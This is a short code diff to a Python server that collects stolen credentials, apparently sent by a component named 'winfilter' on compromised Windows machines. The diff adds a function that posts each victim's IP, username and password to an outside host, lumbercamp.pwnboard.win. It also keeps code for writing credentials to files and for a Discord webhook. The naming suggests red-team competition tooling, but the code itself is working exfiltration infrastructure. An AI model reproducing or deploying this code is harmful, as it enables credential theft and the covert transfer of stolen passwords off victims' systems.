@@ -7,6 +7,7 @@ import datetime
 
 print_lock = threading.Lock()
 
+pwnboard = "http://lumbercamp.pwnboard.win/pwn/boxaccess"
 
 def handle_client(conn, addr):
     data = conn.recv(1024)
@@ -28,7 +29,9 @@ def handle_client(conn, addr):
 
     # discordWH(ip, username, password)
 
-    writeFile(storage, ip)
+    # writeFile(storage, ip)
+
+    updatePwnboard(ip, username, password)
 
     if not data:
         print_lock.release()
@@ -50,6 +53,12 @@ def discordWH(addr, username, password):
     else:
         print("Payload delivered successfully, code {}.".format(result.status_code))
 
+def updatePwnboard(ip, username, password):
+    data = {'ip': ip, 'service': 'system', 'username': username, 'password': password, 'message': "credentials from winfilter"}
+    try:
+        req = requests.post(pwnboard, json=data, timeout=3)
+    except Exception as E:
+        print(E)
 
 def writeFile(storage, ip):
     with open(f"creds/{ip}", "a") as f:
